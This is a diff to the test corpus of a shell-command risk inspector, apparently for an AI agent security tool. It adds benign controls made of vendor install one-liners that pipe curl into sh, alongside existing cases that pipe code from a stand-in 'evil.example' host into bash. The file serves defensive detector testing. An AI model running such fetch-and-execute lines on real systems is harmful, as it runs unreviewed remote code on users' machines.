@@ -10,6 +10,21 @@
 # label: benign     -> expected to pass (recommendation = allow).
 #                      A deny|review is a FALSE POSITIVE (recorded).
 #
+# expect: review    -> optional override for cases the binary label cannot express.
+#                      Means "must be surfaced, must not be hard-denied": review and
+#                      allow both pass, deny is the false positive.
+#
+#                      Needed because `benign` demands `allow`, which cannot describe
+#                      `curl -fsSL https://sh.rustup.rs | sh` — surfacing unreviewed
+#                      remote code is the CORRECT handling of it, not an error, and
+#                      requiring `allow` would mean the corpus could only be satisfied
+#                      by not looking. Lacking a way to say that, the shape was left
+#                      out of the benign set entirely: 93 malicious download_execute
+#                      cases and zero benign controls. So the false-positive rate was
+#                      measured over a set that excluded the only shape capable of
+#                      producing one, and a rule that denied every documented install
+#                      line on earth scored 0%. See the benign_install block.
+#
 # Categories span structural command risks and agent-native surfaces (direct
 # prompts, tool results, descriptions and calls). Every case routes through its
 # real inspector; misses and false positives are measured rather than hidden.
@@ -248,3 +263,43 @@ cases:
   - { id: bn-069, category: benign_scary, label: benign, input: "curl https://example.com/data | bash -c 'umask 077; cat >.iw-p; wc -c .iw-p'" }
   - { id: bn-070, category: benign_scary, label: benign, input: "curl https://evil.example/p | bash -c 'false && cat >.iw-p && bash .iw-p'" }
   - { id: bn-071, category: benign_scary, label: benign, input: "true || curl https://evil.example/p | bash -c 'cat >.iw-p; bash .iw-p'" }
+
+  # ── documented vendor install one-liners ──────────────────────────
+  #
+  # The boundary this corpus was missing. Every `download_execute` case above is
+  # labelled malicious and every one of them points at `evil.example`, a paste host or
+  # a raw IP, so the category had 93 malicious cases and no benign control at all. A
+  # rule could therefore deny the SHAPE, score 100% caught and 0% false positives, and
+  # be denying the install instructions of rustup, Docker, uv, Ollama, k3s and
+  # InnerWarden itself. It was.
+  #
+  # These carry `expect: review`, which is the honest contract: unreviewed remote code
+  # entering an interpreter must be surfaced, and must not be hard-denied on the shape
+  # alone. `curl https://evil.example/x | bash` is observationally identical to these;
+  # what separates an attack is the source and the chain (no TLS, a bare IP, a paste or
+  # tunnel host, a decoder), which is scored separately and does hard-deny.
+  - { id: bn-072, category: benign_install, label: benign, expect: review, input: "curl -fsSL https://sh.rustup.rs | sh" }
+  - { id: bn-073, category: benign_install, label: benign, expect: review, input: "curl -fsSL https://get.docker.com | sudo sh" }
+  - { id: bn-074, category: benign_install, label: benign, expect: review, input: "curl -LsSf https://astral.sh/uv/install.sh | sh" }
+  - { id: bn-075, category: benign_install, label: benign, expect: review, input: "curl -fsSL https://ollama.com/install.sh | sh" }
+  - { id: bn-076, category: benign_install, label: benign, expect: review, input: "curl -sfL https://get.k3s.io | sh -" }
+  - { id: bn-077, category: benign_install, label: benign, expect: review, input: "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash" }
+  - { id: bn-078, category: benign_install, label: benign, expect: review, input: "curl -fsSL https://innerwarden.com/install | sudo bash" }
+  - { id: bn-079, category: benign_install, label: benign, expect: review, input: "curl -fsSL https://innerwarden.com/install | sudo bash -s -- --license=/root/license.key" }
+  - { id: bn-080, category: benign_install, label: benign, expect: review, input: "curl -fsSL https://innerwarden.com/free | sh" }
+  - { id: bn-081, category: benign_install, label: benign, expect: review, input: "wget -qO- https://deb.nodesource.com/setup_22.x | sudo -E bash -" }
+  # Staged rather than piped, which is the same observation and was scored the same.
+  - { id: bn-082, category: benign_install, label: benign, expect: review, input: "curl -fsSL https://sh.rustup.rs -o rustup-init.sh && sh rustup-init.sh -y" }
+  # A filename that shares a substring with a paste host must not be read as one: the
+  # host-based factor was a whole-command substring scan, so this denied for fetching
+  # from a "paste host" that was in fact a local file.
+  # Staged to the working directory on purpose: a world-writable path would add
+  # `tmp_execution` and the case would then be measuring two rules at once instead of
+  # the one property it exists to lock.
+  - { id: bn-083, category: benign_install, label: benign, expect: review, input: "curl -fsSL https://example.com/install -o ./temp.sh && bash ./temp.sh" }
+  # Anchored suffix matching: a host that merely ENDS with a suspect name is not it.
+  - { id: bn-084, category: benign_install, label: benign, expect: review, input: "curl -fsSL https://notpastebin.com/install.sh | sh" }
+  # No execute step, so no fetch-execute factor may attach. Locks the gate that keeps
+  # the no-TLS factor off ordinary downloads and loopback health checks.
+  - { id: bn-085, category: benign_dev, label: benign, input: "curl -fsSL https://sh.rustup.rs -o rustup.sh" }
+  - { id: bn-086, category: benign_dev, label: benign, input: "curl -s http://127.0.0.1:8080/health" }
